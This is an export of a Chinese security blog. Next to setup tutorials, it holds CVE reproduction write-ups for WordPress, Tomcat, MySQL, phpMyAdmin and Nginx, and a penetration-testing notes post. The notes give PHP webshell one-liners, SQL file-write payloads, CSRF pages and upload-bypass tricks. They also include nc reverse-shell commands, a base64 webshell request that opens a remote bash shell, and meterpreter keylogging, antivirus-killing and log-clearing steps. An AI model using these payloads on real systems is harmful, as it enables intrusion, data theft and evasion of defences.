"log4js": "^0.6.29", "nedb": "^1.5.1", "nugget": "^2.0.0", "superagent": "^3.8.3", "superagent-proxy": "^1.0.0", "through": "^2.3.8" &#125;, "devDependencies": &#123; "electron-prebuilt": "^0.37.2" &#125;&#125;在antSword目录下,执行命令将其打包。1yarn dist完成之后会生成一个dist目录，在目录中就有成功打包的antSword。总结这次耗费了大半天的时间,查阅了无数资料,发现还是官方的文档最好!elecctron-builder打包程序时，需要建立一个app文件夹&amp;两个package.json（一个作为打包使用，一个作为项目使用）;elecctron-builder打包程序时，把所有程序的资源文件、代码文件等都放到app文件夹下；遇到cannot unpack electron zip file, will be re-downloaded error=zip: not a valid zip file，请删除缓存rm -rf ~/Library/Caches/electron/编译出来的程序无法正常运行，可通过运行dist(release)/mac/xxxx.app/Contents/MacOS/xxxx，查看错误信息以便定位问题；两个package.json的区别，根据我的理解（不一定正确，大家可以看官方文档），最外层的package.json是打包的配置信息，里层的package.json为项目的配置信息。因此依赖（dependencies、devDependencies）写在里面package.json。]]></content>
      <categories>
        <category>安全研究</category>
        <category>工具</category>
      </categories>
      <tags>
        <tag>工具</tag>
        <tag>渗透</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[MacOS python2 pycurl安装]]></title>
    <url>%2Farchives%2F366a0bef.html</url>
    <content type="text"><![CDATA[MacOS安装pycurl的时候出了一堆问题：SSL、Permitted等，用网上的一堆方法都无法成功安装。最后，通过查看pycurl官网文档、网上资料结合，终于安装成功！前言一开始使用easy_install、pip两种安装方式都会遇到SSL报错。查询网上资料，指定openssl的环境变量并指定使用openssl安装也无法解决。解决过程下载pycurl源码，解压到对应目录。sudo python setup.py install --with-openssl --openssl-dir=/usr/local/opt/openssl其中”openssl-dir”需要根据自身电脑安装路径进行设置。使用上诉命令会出现权限不够的问题，通过添加–user可以解决。sudo python setup.py install --with-openssl --openssl-dir=/usr/local/opt/openssl --user总结MacOS安装东西真麻烦！！！]]></content>
      <categories>
        <category>Code</category>
        <category>Python2</category>
      </categories>
      <tags>
        <tag>pycurl</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CVE-2017-5487分析]]></title>
    <url>%2Farchives%2F5a5cf5bb.html</url>
    <content type="text"><![CDATA[针对Content Injection Vulnerability in WordPress进行复现并分析。漏洞简述由于WordPress4.7.0-4.7.1REST API接口权限判断不合理导致命令注入。漏洞分析复现过程下载POC脚本，运行即可。原理分析查看/wp-includes/rest-api/endpoints/class-wp-rest-posts-controller.php的第90行，发现参数ID的值会被过滤成数字。发现REST API在管理访问时，其会在正则表达式之前优先考虑$_GET和$_POST的值。例如: /wp-json/wp/v2/posts/1234?id=12345helloworld，REST API会将其ID参数设置成12345helloworld。在99行使用了update_item和update_item_permissions_check。查看593行的update_item_permissions_check函数，其将ID值传递给get_post()函数。这个函数功能用来检查帖子是否存在、是否有权限。如果发送的ID没有对应的post，就可以绕过权限检查，并允许继续执行update_item方法。由于使用get_instance()静态方法来获取post，造成get_post()在特定情况下无法找到对应的ID。查看/wordpress/wp-includes/class-wp-post.php第210行，发现需全部使用数字，例如123ABC将会导致获取post失败。有一个细节，其会将ID参数在传递给get_post之前会将其转换成整数。PHP语言中做类型的比较和转换时，其会返回整数。例如例如提交一个请求为/wp-json/wp/v2/posts/123?id=456ABC，PHP会将其ID返回456。由于456ABC并不是纯数字会导致/wordpress/wp-includes/class-wp-post.php获取post_id失败。在流程进入权限检查时update_item_permissions_check判断其没有对应的post绕过权限判断，进行更新操作update_item。最终导致ID为456被修改。在受影响的WordPress版本中REST API接口是默认开放的。任何用户都可以利用该漏洞修改任意文章，只需要指定修改文章的ID即可。修改前：修改后：复现注意事项在复现时如果遇到id is not of type integer报错信息，有可能是因为版本不对。最新版本的4.7.2已经对该漏洞进行修复。修复建议升级WordPress至4.7.2及以上。]]></content>
      <categories>
        <category>安全研究</category>
        <category>漏洞分析</category>
      </categories>
      <tags>
        <tag>安全研究</tag>
        <tag>漏洞分析</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CVE-2016-8735分析]]></title>
    <url>%2Farchives%2Fc77f03de.html</url>
    <content type="text"><![CDATA[针对CVE-2016-8735复现并分析。漏洞简述Tomcat启动JmxRemoteLifecycleListener监听器，在/conf/server.xml中添加Tomcat默认未开启JmxRemoteLifecycleListener监听器。在实际环境中，使用zabbix（是一个基于WEB界面的提供分布式系统监视以及网络监视功能的企业级的开源解决方案）通过JMX监控tomcat即会产生该漏洞环境。漏洞分析复现过程1java -cp ysoserial-0.0.5-SNAPSHOT-all.jar ysoserial.exploit.RMIRegistryExploit localhost 10001 Groovy1 calc.exePOC分析根据攻击命令发现攻击函数为RMIRegistryExploit在ysoserial-0.0.5-SNAPSHOT-all.jar包中的ysoserial.exploit中。通过解压缩软件将RMIRegistryExploit从ysoserial-0.0.5-SNAPSHOT-all.jar解压出来。由于解压出来为class，对其进行反编译。第13行定义了RMIRegistryExploit类，第20行需传递一个数组，21行抛出Exception异常类型。第23行-25行定义了host为数组的第一位数值，port（int）为数组的第二位数值（通过Integer.parseInt将整形对象转换成int型），command为数组的第三位数值。在26行使用java.rmi.registry.LocateRegistry中的LocateRegistry.getRegistry方法来返回对Registry对象的引用。在27行定义一个string 名字为className，通过StringBuilder创建一个新实例（结合后面代码中的append可发现用于快速进行字符相加），并获取CommonsCollections1的包的名字，最后把待执行的命令加上包的名字整体作为string赋值给className。28行获得该类(className)并初始化该类。第29行执行exploit.warp，传递三个参数；第35行使用ExecCheckingSecurityManager的wrap并传一个对象，该对象包含三个参数（payloadClass、command、registry），跟踪ExecCheckingSecurityManager（ysoserial.secmgr.ExecCheckingSecurityManager）查看warp的作用（用于并发）。倒回去看RMIRegistryExploit.java，className来源于CommonsCollections1，跟踪CommonsCollections1类（ysoserial.payloads. CommonsCollections1），该类继承了PayloadRunner。跟踪PayloadRunner（ysoserial.payloads.util. PayloadRunner）的run方法，在第22行发现该方法将传进来的args、clazz并发设为新对象并转换成byte。第29行使用Deserializer.deserialize将serialized反序列化赋值为对象obj。倒回去看CommonsCollections1，第41行到53行，用Transformer创建了transformers数组，数组中按顺序包含了ConstantTransformer、InvokerTransformer、InvokerTransformer、InvokerTransformer、ConstantTransformer对象。ConstantTransformer获取其构造函数中传入的类；InvokerTransformer执行其构造函数中传入的方法。跟踪transformers，第58行使用Reflections.setFieldValue();方法：利用反射机制，将transformerChain对象的iTransformers属性赋值为transformers。修复建议升级Tomcat改变JMX密码认证]]></content>
      <categories>
        <category>安全研究</category>
        <category>漏洞分析</category>
      </categories>
      <tags>
        <tag>安全研究</tag>
        <tag>漏洞分析</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CVE-2016-6663分析]]></title>
    <url>%2Farchives%2Fe5fd1c70.html</url>
    <content type="text"><![CDATA[针对MySQL / MariaDB / PerconaDB - 提权/条件竞争漏洞进行复现并分析。漏洞简述存在条件竞争漏洞，导致本地用户使用低权限帐号提升到数据库系统用户。漏洞分析复现过程查看数据库版本:mysql -V。建立低权限数据库用户，并新建库。下载CVE-2016-6663 POC，并编译。查看当前用户id.运行CVE-2016-6663 POC。下载CVE-2016-6664 POC 并更改权限。运行CVE-2016-6664 POC。原理分析MySQL数据库可以通过data directory指定存储目录，并将目录权限更改为mysql。复现注意事项缺少mysql.h，安装libmysqlclient-dev。修复建议升级MySQL；在my.cnf中添加：symbolic-links = 0。]]></content>
      <categories>
        <category>安全研究</category>
        <category>漏洞分析</category>
      </categories>
      <tags>
        <tag>安全研究</tag>
        <tag>漏洞分析</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CVE-2016-6662分析]]></title>
    <url>%2Farchives%2F438a17c4.html</url>
    <content type="text"><![CDATA[针对MySQL Code Execution Privilege Escalation进行漏洞复现并分析。漏洞简述在MySQL / MariaDB / PerconaDB 5.5.52 / 5.6.33 / 5.7.15等版本中，默认安装MySQL使用自带mysqld_safe脚本启动mysql服务进程，在启动mysql server之前预加载共享库文件，共享库文件可被添加至my.cnf。漏洞分析复现过程下载cve-2016-6662_MySQL_RCE_exploit.py和mysql_hookandroot_lib.c，并放同一目录下（.so文件运行py时会自动生成）。修改mysql_hookandroot_lib.c第63行（攻击服务器IP）、64行（监听端口）、65行（my.cnf路径）。运行py脚本。1python cve-2016-6662_MySQL_RCE_exploit.py -dbuser root -dbpass '' -dbname pocdb -dbhost 127.0.0.1 -mycnf /etc/mysql/my.cnf这时候，查看/etc/mysql/my.cnf文件，发现共享库已经成功添加。重启mysql服务，成功反弹shell。原理分析默认安装MySQL会自带mysql_safe脚本，启动MySQL之前加载共享库，共享库可以添加至my.cnf。跟进/usr/bin/mysqld_safe，在第331行看到–malloc-lib=LIB 选项可以加载一个so文件。在424行，可以看到mysqld_safe从mysql的data目录下载入配置文件my.cnf。使用ps aux | grep mysql，查看MySQL的进程信息，发现mysqld_safe是root权限执行的，mysqld是mysql用户执行的。在my.cnf中写入malloc_lib加载so文件的路径。使用gcc命令将.c（shell）编译成so，并将so放置到/var/lib/mysql/目录下。配置文件和so文件冲准备就绪，重启MySQL，root运行mysqld_safe，mysqld_safe加载so文件，则触发代码执行。复现注意事项/etc/mysql/my.cnf权限设置：12chown mysql:root /etc/mysql/my.cnfchmod 600 /etc/mysql/my.cnf攻击会在攻击database新建一个表，表名为:poctable，如果攻击失败，重新攻击需将poctable删除。123mysql -uroot -p；use pocdb;（攻击database的数据库名字）drop table poctable;py脚本会自动运行nc，因此攻击服务器需要安装nc。如果攻击端口不为3306，可以在cve-2016-6662_MySQL_RCE_exploit.py第74行增加自定义端口代码。增加完成之后，即可使用-dbport自定义端口。在第83行，增加代码将其使用。12parser.add_argument('-dbport', dest='TARGET_PORT', required=True, help='MySQL port') # 74行dbconn = mysql.connector.connect(user=args.TARGET_USER, password =args.TARGET_PASS, database=args.TARGET_DB, host=args.TARGET_HOST, port=args.TARGET_PORT) # 83行修复建议升级MySQL。]]></content>
      <categories>
        <category>安全研究</category>
        <category>漏洞分析</category>
      </categories>
      <tags>
        <tag>安全研究</tag>
        <tag>漏洞分析</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CVE-2016-5734分析]]></title>
    <url>%2Farchives%2F94f683da.html</url>
    <content type="text"><![CDATA[针对phpMyAdmin 4.6.2 - Authenticated Remote Code Execution进行漏洞复现并分析。漏洞简述phpMyAdmin 是一个以PHP为基础，以Web-Base方式架构在网站主机上的MySQL的数据库管理工具，让管理者可用Web接口管理MySQL数据库。在4.6.2版本中preg_replace /触发的callback导致命令执行。漏洞分析复现过程下载POC并执行即可。漏洞分析这个漏洞出现在TableSearchController.php中的getRegexReplaceRows函数。跟进/libraries/controllers/table/TableSearchController.php，第708行定义getRegexReplaceRows函数，在第731行处$find存在任意一个范围符号的时候,在$find前面加上/。在661行getReplacePreview函数调用了getRegexReplaceRows。在613行findAction函数调用了getReplacePreview。在175行indexAction函数调用了findAction，当searchType为replace调用findAction。在/tbl_find_replace.php第33行调用indexAction。根据以上可得知，调用getRegexReplaceRows函数的流程为：12345/tbl_find_replace.ph →/libraries/controllers/table/TableSearchController.php indexAction() →/libraries/controllers/table/TableSearchController.php findAction() →/libraries/controllers/table/TableSearchController.php getReplacePreview() →/libraries/controllers/table/TableSearchController.php _getRegexReplaceRows()当row[0]成功匹配$find即可执行命令，在716，717行存在db、table两个成员。在/libraries/controllers/TableController.php第20、25行分别定义了$db、$table。回溯Controller类，跟进/libraries/di/Container.php，在51行定义get函数。当$find构造为0/e0，preg_replace将$find变成/0/e0/，在php5.5以下发生截断，变成preg_replace(/0/e, command,0/e)。由此代码执行产生。修复建议升级phpMyAdmin。]]></content>
      <categories>
        <category>安全研究</category>
        <category>漏洞分析</category>
      </categories>
      <tags>
        <tag>安全研究</tag>
        <tag>漏洞分析</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CVE-2016-1240分析]]></title>
    <url>%2Farchives%2F29004be5.html</url>
    <content type="text"><![CDATA[针对Apache Tomcat 8/7/6 (Debian-Based Distros) - Privilege Escalation进行漏洞复现并分析。漏洞简述Debian系统的Linux上，使用apt-get安装Tomcat时,deb包安装的Tomcat程序会自动为管理员安装一个启动脚本：/etc/init.d/tomcat* 利用该脚本，可导致攻击者通过低权限的Tomcat用户获得系统root权限。只需要将Tomcat的日志文件catalina.out软链接到系统文件，重新打开catalina.out就可获取root权限。漏洞分析复现过程获取POC脚本，运行POC脚本。1./tomcat-rootprivesc-deb.sh /var/log/tomcat7/catalina.out运行之后/var/log/catalina.out的链接已经指向/etc/ld.so.preload。重启Tomcat服务。1serverce tomcat7 restartPOC分析POC脚本85行判断用户是否为tomcat用户。93行判断指定的tomcat日志文件是否存在。158行删除日志文件并软链接到/etc/ld.so.preload。168行判断/etc/ld.so.preload文件是否存在。188行通过判断/tmp/tomcatrootsh文件是否具有rws 权限 root 匹配到返回0。199行删除/etc/ld.so.preload和/tmp/privesclib.so。跟踪$BACKDOORPATH变量，在148行$BACKDOORPATH是从$BACKDOORSH复制而来，根据开头变量的定义发现$BACKDOORSH为/bin/bash。修复建议升级Tomcat。]]></content>
      <categories>
        <category>安全研究</category>
        <category>漏洞分析</category>
      </categories>
      <tags>
        <tag>安全研究</tag>
        <tag>漏洞分析</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[python3 pip缺失VC++]]></title>
    <url>%2Farchives%2Ff62064af.html</url>
    <content type="text"><![CDATA[最近使用python3的pip安装scrapy、mysql-python等库出错，需要安装Microsoft Visual C++。网上资料大部分通过源码方式解决，不能一劳永逸解决。这里我从根源解决。VC++缺失使用pip install scrapy安装scrapy出现缺失VC++。根据报错信息打开VC Build Tools站点点击红框中的链接，找到Visual Studio 2017 生成工具下载对应文件。打开下载下来的vs_buildtools程序，勾选Visual C++生成工具，进行安装。接下来安静等待安装完成。安装完成之后，再使用pip install scrapy即可成功安装。]]></content>
      <categories>
        <category>Code</category>
        <category>Python3</category>
      </categories>
      <tags>
        <tag>Code</tag>
        <tag>Python3</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Go-VSCode环境搭建]]></title>
    <url>%2Farchives%2Fc70ca2a9.html</url>
    <content type="text"><![CDATA[最近项目上用到了Go，因此对VSCode进行Go环境搭建。效果图如下：GoGo安装去Golang官网下载对应版本的安装包，我这里是Windows操作系统，因此下载go1.10.2.windows-amd64.msi。由于Golang官网需要科学上网，如果没有翻墙的软件，可以去Go语言中文网下载，下载页面。安装过程直接Next过去即可。安装完成之后，打开CMD输入go version查看go 版本信息。Go环境配置Go安装完成之后，在CMD下输入go env查看go的环境变量。有两个关键的变量：GOROOT、GOPATH。GOROOT为Go安装目录不需要进行修改，GOPATH为Go项目地址可以进行修改。在喜欢的地方建立一个Go项目目录。这里我在C盘根目录下建立一个文件夹，名称为GoWork。然后将其配置到系统环境变量中。配置完成之后，重新打开一个CMD输入go env查看是否生效。到此Go的配置告一段落。VSCodeVSCode安装去Visual Studio Code官网下载对应版本的安装包安装即可。安装过程直接Next过去即可。VSCode安装完成之后需要配置Git，可以查看这篇文章搭建博客，这里就不展开了。VSCode环境配置Go插件安装在VSCode商店里面安装对应Go插件。可以直接通过VSCode欢迎使用页面的自定义→工具和语言→更多进行跳转。安装完成之后打开Go项目文件夹，新建一个hello.go，打开hello.go，在右小角进行点击Install All安装所依赖的库（该步骤需要翻墙）。安装完成之后，在工作目录下会多出一个bin子目录里面会放所需要的exe文件。如果翻不了墙，那么可以直接下载这个，放到Go项目文件夹下的bin目录即可。链接：https://pan.baidu.com/s/19w01LlfY8iEsLm5gJmP5Lw 密码：umaoDebug完成以上操作之后，可以通过F5进行Debug。总结在进行VSCode进行Go Debug时，遇到了几个需要注意点，在此记录一下供诸君参考：完成Go安装之后，需要进行GOPATH环境变量配置，便于项目目录查找；完成VSCode安装之后，在VSCode的终端里面输入go命令查看VSCode是否能调用系统环境变量。如果在VSCode终端找不到go命令，在用户环境变量里面进行添加可以解决该问题。假设还解决不了，直接在终端进行path环境变量追加set path=%path%;C:\go\bin；如果VSCode依赖的库安装失败，直接把src、bin、pkg目录都删除，然后重新安装。Go代码1234567package mainimport "fmt"func main() &#123; fmt.Println("Hello, Hywell")&#125;]]></content>
      <categories>
        <category>Code</category>
        <category>Go</category>
      </categories>
      <tags>
        <tag>环境搭建</tag>
        <tag>Go</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CVE-2016-1247分析]]></title>
    <url>%2Farchives%2Feca7756b.html</url>
    <content type="text"><![CDATA[针对CVE-2016-1247漏洞进行复现、研究分析原理。前言Nginx是一个高性能的HTTP和反向代理服务器，也是一个 IMAP/POP3/SMTP 代理服务器。 Nginx 是由 Igor Sysoev 为俄罗斯访问量第二的 Rambler.ru 站点开发的，第一个公开版本0.1.0发布于2004年10月4日。其将源代码以类BSD许可证的形式发布，因它的稳定性、丰富的功能集、示例配置文件和低系统资源的消耗而闻名。2011年6月1日，nginx 1.0.4发布。 Nginx是一款轻量级的Web 服务器/反向代理服务器及电子邮件（IMAP/POP3）代理服务器，并在一个BSD-like 协议下发行。由俄罗斯的程序设计师Igor Sysoev所开发，其特点是占有内存少，并发能力强。漏洞简述Debian、Ubuntu发行版的Nginx在新建日志目录的时，使用了不安全的权限，因此本地恶意攻击者可以从nginx/web用户权限(www-data)提升到ROOT。漏洞分析复现过程查看用户ID查看Nginx版本dpkg -l | grep -i nginx下载poc脚本1wget https://legalhackers.com/exploits/CVE-2016-1247/nginxed-root.sh修改poc权限,并执行poc12chmod 777 nginxed-root.sh./nginxed-root.sh /var/log/nginx/error.log查看现在用户IDPOC分析查看Nginx日志目录权限，发现为www-data，因此该漏洞需要使用www-data用户进行查看Nginx日志目录下的文件权限，发现为root权限，通过符号链接将替换日志文件实现提权目的根据POC进行利用分析，在145行使用dlsym获取euid在147、148行修改/tmp/nginxrootsh文件的所有者和权限在149行删除/etc/ld.so.preload文件在154行编译生成的c文件，在其后判断是否编译成功在162行将/bin/bash拷贝到/tmp/nginxrootsh在172行删除nginx的错误日志文件并进行符号链接，将/etc/ld.so.preload（目标）软链接到nginx的错误日志（这步骤实现了提权）在187行将/etc/ld.so.preload内容覆盖为/tmp/privesclib.so（加载/tmp/privesclib.so共享库）在199行将/etc/ld.so.preload权限设置为755注意事项root用户执行logrotate -f /etc/logrotate.d/nginx，未获取到root权限情况下重启nginx服务并删除相关文件。修复建议升级Nginx版本。]]></content>
      <categories>
        <category>安全研究</category>
        <category>漏洞分析</category>
      </categories>
      <tags>
        <tag>安全研究</tag>
        <tag>漏洞分析</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[渗透笔记整理]]></title>
    <url>%2Farchives%2Fff82748e.html</url>
    <content type="text"><![CDATA[最近在整理印象笔记，其中有许许多多经验、研究和杂七杂八的想法，我会逐步上传到博客。渗透笔记CSRFCSRF全名是Cross-site request forgery，理解上为伪造其他用户执行操作。攻击网页没有token头字段，通过请求拦截的方式，将对应URL记录下来。通过构建一个恶意页面，恶意页面代码如下:1234567# GET类型&lt;img src="操作行为的URL"&gt; # POST类型&lt;form id="aa" action="操作行为的UR" method="post" name="form1"/&gt;&lt;input type="submit" name="button" id="button" style="display:none;"/&gt;&lt;script&gt;window.location = "http://x.x.x.x";&lt;/script&gt;诱使对应人员点击该页面即可触发CSRF攻击。防御思路针对CSRF攻击，防御方面：在重要操作执行钱需要进行验证码校验站点添加token（或者自定义）头字段。由于token是随机并且一次性。在使用post方法时，防止token出现在URL（可以通过构建恶意网站 使用户访问恶意网站 恶意网站在后台构建假冒用户操作）通过抓包删除referer 测试针对CSRF攻击总结：防御方面为对操作进行用户身份验证；攻击方面可以构建的代码：form iframe img xhr link等。攻击衍生可以将XSS与CSRF结合：通过XSS让用户跳转到CSRF页面执行恶意操作。SQL InjectionSQL Injection通过把SQL命令插入到Web表单递交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令。攻击思路最简单的注入思路就是针对id=、class=这些参数进行注入。看到过一次二次注入的思路：注册用户时将用户名设置成注入语句，在个人中心处注入语句被调用形成注入。因此，允许输入与数据库交互那么便有可能存在注入。例如cookie等报文头里面的数据，如果数据库会记录该数据那变可能存在注入。攻击衍生当站点对输入进行过滤（防御），可以尝试使用编码转换，将注入语句转码。内网渗透内网渗透是指渗透人员获取了一台内网主机时，针对内网进行内网渗透的过程。123456789101112131415Windows# 查看用户权限whoami# 提权 pr # 开启远程桌面REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 0 /f# 查看计算机信息systeminfo# 获取密码mimikatz# 进程信息tasklist /svc # 查看端口 netstart -an上传漏洞IIS6.01.目录名称为a.asp，该目录下的文件都会以asp解析；2.上传a.asp;.xx.jpg类型的文件，由于IIS6.0解析”;”会截断，所以在解析时可以理解为以asp文件类型解析。IIS7.0/7.5+Nginx≤0.8.37IIS7.0/7.5，在PHP配置文件中，开启了cgi.fix_pathinfo（该配置默认开启），当文件为php类型，iis会交给php解析；nginx和iis7.5类似:Fast-CGI开启状况（默认），上传内容为:1&lt;?php fputs(fopen('cmd.php','w'),'&lt;?php eval($_POST[cmd])?&gt;');?&gt;的x.jpg。访问../../../x.jpg/.php会在根目录下生成一个cmd.php;在文本前面加上 Gif89a 让服务器以为该文本为图片类型文件;双文件上传 通过在上传&lt;input type=&quot;FileName&quot; type=&quot;FILE&quot;&gt;后面在加入&lt;input type=&quot;FileName&quot; type=&quot;FILE&quot;&gt;。下载网页源码 另存为到桌面 然后第一个地方上传正常图片 第二个地方上传马;上传一句话木马可以对一句话多次加密。上传成功之后，如果连接一句话被防护设备阻断，可以通过修改菜刀进行连接。原理是因为当前防护设备是针对网络流量进行识别，当流量中出现对应关键字会进入识别流程，当所有条件都满足时就会阻断该流量。该方式绕过方式千千万，只要特征不命中即可。SQL命令记录MySQL数据库在渗透的时候可以用到的命令：123456789101112131415161718192021222324252627282930# 导出文件Select '&lt;? php eval($_POST[cmd]);?&gt;' into outfile 'F:/wwwroot/eval.php';## 导出一句话create table cmd (a varchar(50));insert into cmd (a) values ('一句话木马');select * into [a] in 'e:\web\webshellcc\1.asa;x.xls' 'excel 4.0;'from cmd;drop table cmd;Select 'asp一句话木马' into [vote] in 'e:\web\webshellcc\1.asa;x.xls' 'excel 8.0;' fromvote;select into outfile(dumpfile); //MySQL写文件命令 (例如：select "&lt;?php echo 'test'; ?&gt;" into outfile "F:\\www\\test.php";）# 系统用户名system_user()# 用户名user()# 当前用户名current_user# 连接数据库的用户名session_user()# 数据库名database()# MYSQL数据库版本version()# MYSQL读取本地文件的函数load_file()# 读取数据库路径@@datadir# MYSQL 安装路径@@basedir# 操作系统@@version_compile_osPHP爆破路径1.错误参数爆路径2.google搜索： sieze:xxx.com warning size:xxx.com phpmyadmin(phpMyadmin3.测试文件爆路径 test.php ceshi.php info.php4.注入点读取配置文件 load_file小迪学习笔记我在刚刚接触渗透的时候，经常会看小迪的渗透教程视频。那时候，边学边记。小迪第一讲小迪第一讲主要讲解一下基础的知识，便于后期理解。软件：APMServ1234567891011# web环境iis6.0（Windows2003）iis7.X（win7 Windows2008）Apache（linux Windows）# 常见搭配asp + access + iisasp + sqlserver + iisphp + mysql + Apache tomcat jsp + sqlserver + tomcatjsp + oracle +tomcataspx + sqlserver + iis小迪第四讲一个页面 http://www.xxx.com/xxx.asp?id=xx,存在cookie注入。使用SQLMap进行攻击，命令如下：`sqlmap： sqlmap.py -u http://www.xxx.com/xxx.asp –cookie “id=xx” –level 2`小迪第五讲数字型注入：and 1=1。例如:select from admin where id=1字符型注入：&#39; and &#39;1&#39;=&#39;1,在代码处由于字符型需要加单引号或者双引号。例如:select from admin where a=&#39;a&#39;搜索型注入：%&#39;小迪第七讲通过 load_file 读取后台文件 例如：前台页面向后台login.php传递参数并判断然后跳转 这时候可以通过 load_file sql注入语句来读取login.php文件小迪第九讲服务器常见状态码：123451XX：正在处理2XX：成功3XX：重定向4XX：客户端错误 403：存在（没权限） 404：不存在5XX：服务器错误 500：可能存在小迪第十讲该课程主要讲解mssql综合利用工具，由于是工具利用，所以并没有详细记录。小迪第十一讲验证机制分为：本地、远程。本地验证可以通过禁用、删除等方式进行绕过。解析漏洞：1234567891011IIS6.0：文件名： 1.asp;.jpg文件夹：用户名为 1.asp 文件类型：1.jpgIIS7.X uginx：http://www.xxx.com/logo.gif解析漏洞:http://www.xxx.com/logo.gif/x/phpapache:首先是否系统能否解析的后缀名http://www.xxx.com/logo.php.asdasd 最后的后缀无法识别 便继续往前推小迪第十二讲IIS 解析漏洞利用path：a.asp;.,在上传的时候通过修改文件前缀。不单单是文件前缀，如果上传包中存在path，可以通过修改path。因为有时候验证是通过文件名filename，而不验证filepath。图片马使用UE（uedit）编辑器即可添加。小迪第十四讲针对上传绕过时，首先需要知道过滤方式。可通过多次上传来猜解其过滤方式。利用手段00截断：1.asp’\0’.jpg:通过UE将上传包保存为文本文档在上传文件名后面加上：空格 .jpg。例如 1.asp .jpg。通过UE将空格 20 修改为 00在上传包文本中 包长度 length 数值加5检验文件类型 通过抓包修改过滤不全 asp asa cer cdx htr检验文件头：在文件头前面加上 GIF89a工具一句话流量学习1234567891011# url执行命令POST /test.php HTTP/1.1X-Forwarded-For: 199.1.88.29Referer: http://192.168.168.147Content-Type: application/x-www-form-urlencodedUser-Agent: Mozilla/5.0 (Windows; Windows NT 5.1; en-US) Firefox/3.5.0Host: 192.168.168.147Content-Length: 569Cache-Control: no-cachecmd=@eval(base64_decode($_POST[z0]));&amp;z0=QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0%2BfCIpOzskcD1iYXNlNjRfZGVjb2RlKCRfUE9TVFsiejEiXSk7JHM9YmFzZTY0X2RlY29kZSgkX1BPU1RbInoyIl0pOyRkPWRpcm5hbWUoJF9TRVJWRVJbIlNDUklQVF9GSUxFTkFNRSJdKTskYz1zdWJzdHIoJGQsMCwxKT09Ii8iPyItYyAneyRzfSciOiIvYyB7JHN9Ijskcj0ieyRwfSB7JGN9IjtAc3lzdGVtKCRyLiIgMj4mMSIpOztlY2hvKCJ8PC0iKTtkaWUoKTs%3D&amp;z1=L2Jpbi9zaA%3D%3D&amp;z2=Y2QgIi92YXIvd3d3L2h0bWwvIjtuYyAxOTIuMTY4LjEwLjExIDEzMzcgLWUgL2Jpbi9iYXNoO2VjaG8gW1NdO3B3ZDtlY2hvIFtFXQ%3D%3DNC工具123456正向连接： 服务器命令：nc -l -p 1337 -e /bin/bash 客服端使用：nc &gt;nc x.x.x.x 1337反向连接： 服务器命令：nc 192.168.10.11 1337 -e /bin/bash 客户发命令：nc -lvv -p 1337Metasploit-msfconsole工具Metasploit是一个优秀的渗透测试框架！！！！！！！攻击阶段：使用msfconsole打开Metasploit使用nmap扫描来发现开放端口nmap -T4 -A -v x.x.x.x使用search命令来搜索需要的exp使用use命令来打开exp，之后使用show options查看需要指定的参数使用set rhost等来设置参数之后，通过exploit来获取meterpreter会话信息收集阶段：获取服务器信息（sysinfo、getuid、idletime、run get_env、ifconfig、route）获取服务器当前截屏（screenshot）获取服务器进程信息（ps）将 meterpreter会话迁移至explorer（migrate）开启键盘记录，输出（keyscan_start、keyscan_dump）获取服务器shell（shell）检测服务器是否为虚拟机（run checkvm）启动远程桌面（run getgui -e）;启动telnet服务（run gettelnet -e）获取子网状况（run get_local_subnets）编辑hosts（run hostedit）查看已经登录的用户数（run enum_logged_on_users）获取已安装应用程序（run get_application_list）获取驱动器信息（run windows/gather/forensics/enum_drives）获取产品密钥（run windows/gather/enum_ms_product_keys）获取autologin（run windows/gather/credentials/windows_autologin）使用自动脚本获取系统信息（run winenum）获取服务器额外信息（run scraper；信息存放路径为：.msf5/logs/scrips/scraper/192.x.x.x.x）清理痕迹阶段：检测防火墙状态（run getcountermeasure）关闭杀毒软件（run killav；find / -name ‘killav.rb’；/usr/share/metasploit-framework/scripts/meterpreter/killav.rb）清理日志（clearev）NmapNmap常用命令汇总记录123456789101112131415161718192021222324252627Nmap常用命令参数讲解-d [level] (提高或设置调试级别) 。 -sT tcp端口扫描(完整三次握手)。-sU udp扫描。(不回应可能端口打开,回应是关闭) -sL dns反向解析。 -sM[fin ack mainmon扫描] 。-sS隐蔽扫描(半开syn)。-sP发现扫描网络存活主机。(直连arp非直连tcp80 icmp)-sO确定主机协议扫描。-sA tcp ACK扫描。-sW 对滑动窗口的扫描sI[idlescan]。-sR RPC扫描。(flag没有syn,ack,rst回送rst)-sN 关闭主机发现【空】。(不管是否存在直接扫描)-sF FIN扫描 。(sN sF sX逃避不了ids)-sX Xmas扫描 (fin psh urg为置位)。-sI 完全隐藏。【以一个跳板主机&#123;无流量&#125;扫描另一台主机】-sV 服务版本。-sC 跟安全有关的脚本-P0 指定协议。(不ping主机)(1icmp6tcp17udp47gre50esp51ah53swipe77sun-nd115l2tp120uti132sctp) -PS 端口列表用,隔开[tcp80 syn 扫描]-PA 端口列表用,隔开[ack扫描](PS+PA测试状态包过滤防火墙【非状态的PA可以过】)【默认扫描端口1-1024】-PU 端口列表用,隔开[udp高端口扫描 穿越只过滤tcp的防火墙]-PE [icmp ping types]-PM 掩码请求。-PR [arp ping] 默认直连用。-PN 自己。-PP 时间请求。GoogleHack使用Google搜索往往能获得意想不到的信息。1234567891011121314151617ps：不区分大小写all开头一次查询只能使用一个intext:关键词 （搜索页面正文包含关键词的网页）allintext:关键词,关键词 （拼接多个关键词）intitle:关键词 （搜索页面标题包含关键词的网页）allintitle:关键词,关键词 （拼接多个关键词）cache:url （搜索特定页面的快照）defind:关键词 （搜索关于关键词的定义，不能与其他操作符混用）filetype:关键词 